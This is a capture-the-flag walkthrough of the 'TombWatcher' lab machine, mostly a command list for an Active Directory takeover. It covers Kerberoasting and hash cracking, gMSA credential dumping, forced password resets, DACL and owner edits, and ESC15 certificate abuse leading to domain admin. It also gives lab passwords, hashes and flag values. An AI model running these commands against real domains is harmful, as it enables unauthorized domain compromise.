1. **Initial Recon**: Nmap reveals open ports (53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985) and identifies the domain (tombwatcher.htb) with a certificate authority (tombwatcher-CA-1). SMB enumeration with smbmap shows readable shares (IPC$, NETLOGON, SYSVOL).
2. **AD Enumeration**: NetExec (nxc) collects BloodHound data, identifying users, groups, and computers.
3. **Kerberoasting**: TargetedKerberoast extracts a hash for user Alfred, cracked to basketball using John the Ripper.
4. **Privilege Escalation**: Using Alfred’s credentials, add to the INFRASTRUCTURE group with bloodyAD, then dump ansible_dev$ machine account credentials with gMSADumper. Reset SAM’s password and use it to modify ownership and DACL of john with Impacket’s owneredit and dacledit, resetting John’s password.
5. **User Flag**: Access John’s account via Evil-WinRM to retrieve user.txt (09b993ae21e053c31d9b9bc57f318ee4).
6. **Deleted User Restoration**: From John’s session, restore the deleted cert_admin user, reset its password, and unlock it.
7. **Certificate Exploitation**: Use Certipy to identify the vulnerable WebServer template (ESC15 vulnerability), request a certificate for administrator@tombwatcher.htb, and change the admin password.
8. **Root Flag**: Log in as administrator via Evil-WinRM to retrieve root.txt (e43db98c793db25fbc4254cb867dd49f).

Below is a comprehensive list of all tools an

```
# Tools and Commands Used in TombWatcher HTB Walkthrough

## 1. Nmap (Reconnaissance)
nmap --privileged -sCV -vv -Pn -oN nmap.txt 10.10.11.72

## 2. SMBMap (SMB Share Enumeration)
smbmap -H 10.10.11.72 -u henry -p 'H3nry_987TGV!'

## 3. NetExec (nxc) (AD Enumeration with BloodHound)
nxc ldap 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d TOMBWATCHER.HTB --bloodhound -c All --dns-server 10.10.11.72 --verbose
nxc ldap 10.10.11.72 -u alfred -p 'basketball' -d TOMBWATCHER.HTB --bloodhound -c All --dns-server 10.10.11.72 --verbose

## 4. TargetedKerberoast (Kerberoasting)
faketime -f "2025-09-25 12:00:00" python3 targetedKerberoast.py -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!'

## 5. John the Ripper (Password Cracking)
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

## 6. CrackMapExec (Credential Validation)
crackmapexec smb 10.10.11.72 -u alfred -p 'basketball'
crackmapexec smb 10.10.11.72 -u SAM -p 'Abc123456@'

## 7. BloodyAD (Group Membership and Password Reset)
bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'alfred' -p 'basketball' add groupMember INFRASTRUCTURE alfred
bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'ansible_dev$' -p ':4f46405647993c7d4e1dc1c25dd6ecf4' set password SAM 'Abc123456@'
bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u 'SAM' -p 'Abc123456@' set password john 'Abc123456@'

## 8. gMSADumper (Machine Account Credential Dumping)
python3 gMSADumper.py -u alfred -p basketball -d tombwatcher.htb

## 9. BloodHound-Python (AD Enumeration)
bloodhound-python -u 'ansible_dev$' --hashes ':4f46405647993c7d4e1dc1c25dd6ecf4' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip

## 10. Impacket (Owner and DACL Modification)
impacket-owneredit -action write -target 'john' -new-owner 'sam' 'tombwatcher.htb/sam':'Abc123456@' -dc-ip 10.10.11.72
python3 /usr/share/doc/python3-impacket/examples/dacledit.py -action write -rights FullControl -principal SAM -target JOHN tombwatcher.htb/SAM:Abc123456@ -dc-ip 10.10.11.72

## 11. Evil-WinRM (Remote Shell Access)
evil-winrm -i 10.10.11.72 -u 'john' -p 'Abc123456@'
evil-winrm -i 10.10.11.72 -u 'administrator' -p 'Shubham@123'

## 12. PowerShell (User Restoration and Password Reset in WinRM)
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties *
$deletedUser = Get-ADObject -Filter 'sAMAccountName -eq "cert_admin"' -IncludeDeletedObjects | Sort-Object whenCreated -Descending | Select-Object -First 1
Restore-ADObject -Identity $deletedUser
Set-ADAccountPassword -Identity "cert_admin" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Abc123456@" -Force)
Unlock-ADAccount -Identity "cert_admin"

## 13. Certipy (Certificate Template Exploitation)
certipy find -u cert_admin -p 'Abc123456@' -dc-ip 10.10.11.72 -vulnerable
certipy-ad req -u 'cert_admin' -p 'Abc123456@' -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -application-policies 'Client Authentication'
certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell
# In LDAP shell: change_password administrator Shubham@123
```
